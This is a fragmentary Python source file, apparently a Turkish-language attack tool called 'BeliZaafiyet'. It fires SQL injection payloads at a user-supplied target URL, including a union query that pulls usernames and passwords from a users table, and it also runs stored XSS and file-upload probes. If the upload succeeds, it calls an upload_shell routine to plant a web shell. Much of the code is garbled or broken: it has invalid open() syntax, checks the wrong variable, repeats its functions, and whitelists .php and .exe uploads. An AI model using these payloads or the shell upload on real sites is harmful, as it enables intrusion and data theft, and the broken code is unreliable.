...
def log_yaz(mesaj, dosya_adi="belizaafiyet.log"):
...
\033[0m
    ...
    print("\033[91m" + ascii_logo + "\033[0m")  
...
def log_yaz(mesaj, dosya_adi="belizaafiyet.log"):
    with open(dosya_adi, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now()}] {mesaj}\n")
    with open("sql_injection_test.log", "a") as log_file:
        log_file.write(f"[{time.ctime()}] {mesaj}\n")
    ...
    try:
        for payload in payloads:
            ...
            if payload in response.text and response.status_code == 200:
                print(f"SQL Injection açığı tespit edildi: {test_url}")
        ...
        for param in ["' AND 1=1 --", "' AND 1=2 --"]:
            ...
            if "error" in response.text:
                print(f"Error-based SQLi açığı tespit edildi: {test_url}")
        ...
        for param in ["' AND 1=1 --", "' AND 1=2 --", "' AND 'a'='a' --", "' AND 'a'!='a' --"]:
            ...
            if "error" in response.text:
                print(f"Blind SQLi (Boolean-based) açığı tespit edildi: {test_url}")
                log_yaz(f"Blind SQLi (Boolean-based): {test_url}")
        
        print("[i] Union-based SQLi Testi Yapılıyor...")
        for param in ["' UNION SELECT NULL, username, password FROM users --", "' UNION SELECT 1,2,3 --"]:
            test_url = url + param
            response = requests.get(test_url, timeout=10)
            
            if payload in response.text and response.status_code == 200:
                print(f"Union-based SQLi açığı tespit edildi: {test_url}")
                log_yaz(f"Union-based SQLi Açığı: {test_url}")
        
        print("[i] Time-based Blind SQLi Testi Yapılıyor...")
        for param in ["' OR SLEEP(5) --", "' AND 1=1 AND SLEEP(5) --"]:
            test_url = url + param
            response = requests.get(test_url, timeout=10)
            
            if response.elapsed.total_seconds() > 5:
                print(f"Time-based Blind SQLi açığı tespit edildi: {test_url}")
...
def log_yaz(mesaj, dosya_adi="belizaafiyet.log"):
    with open(dosya_adi, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now()}] {mesaj}\n")
    with open("xss_test.log", "a") as log_file:
        log_file.write(f"[{time.ctime()}] {mesaj}\n")
...
def xss_test(url, dil="TR"):
    ...
    try:
        ...
        for form in forms:
            ...
            if method == "post":
                response = requests.post(action, data=data, timeout=10)
            else:
                response = requests.get(action, params=data, timeout=10)
            
            if any(payload in response.text for payload in xss_payloads):
                print(f"[!] Stored XSS açığı tespit edildi: {action}")
                log_yaz(f"Stored XSS Açığı: {action}")
            else:
                print(f"[✓] Stored XSS açığı tespit edilmedi: {action}")
...
class BeliZaafiyet:
    ...
    def log_yaz(self, message):
        with open("beliZaafiyet.log", "a") as log_file:
            log_file.write(f"[{time.ctime()}] {message}\n")

    def test_file_upload(self):
        print(f"[i] Dosya yükleme testi yapılıyor: {self.url}")
        test_url = f"{self.url}/upload"  
        test_file = {'file': ('test.jpg', open('test.jpg', 'rb') as f  # with open(...) ile güvenli kullanım, 'image/jpeg')}
        
        try:
            response = requests.post(test_url, files=test_file)
            if response.status_code == 200 and "uploaded" in response.text.lower():
                ...
                print("[✘] Dosya yükleme zafiyeti tespit edilmedi.")
                return False
        except requests.exceptions.RequestException as e:
    ...
    def validate_file(self, file_path):
        allowed_extensions = ['.php', '.exe', '.jsp', '.html', '.txt']
        max_size = 2 * 1024 * 1024  
        
        _, ext = os.path.splitext(file_path)
        if ext.lower() not in allowed_extensions:
            print(f"[✘] Geçersiz dosya uzantısı: {ext}")
            self.log_yaz(f"Geçersiz dosya uzantısı: {file_path}")
            return False
        
        file_size = os.path.getsize(file_path)
        if file_size > max_size:
            print(f"[✘] Dosya boyutu çok büyük. Maksimum boyut: 2MB")
    ...
    def upload_file(self, file_path, file_type):
        ...
        files = {'file': (os.path.basename(file_path), open(file_path, 'rb') as f  # with open(...) ile güvenli kullanım)}
        
        try:
            response = requests.post(upload_url, files=files)
            if response.status_code == 200 and "uploaded" in response.text.lower():
                uploaded_url = f"{self.url}/uploads/{os.path.basename(file_path)}"
                print(f"[✓] {file_type} başarıyla yüklendi: {uploaded_url}")
                self.log_yaz(f"{file_type} yüklendi: {uploaded_url}")
                return uploaded_url
            else:
                print(f"[✘] {file_type} yüklenemedi.")
                return False
        except requests.exceptions.RequestException as e:
            print(f"[✘] Hata oluştu: {e}")
    ...
    def upload_shell(self):
        custom_shell_path = ''  # otomatik atanabilir
...
url = input("Hedef URL'yi girin (http://site.com): ").strip()

tool = BeliZaafiyet(url)

if tool.test_file_upload():
    tool.upload_shell()
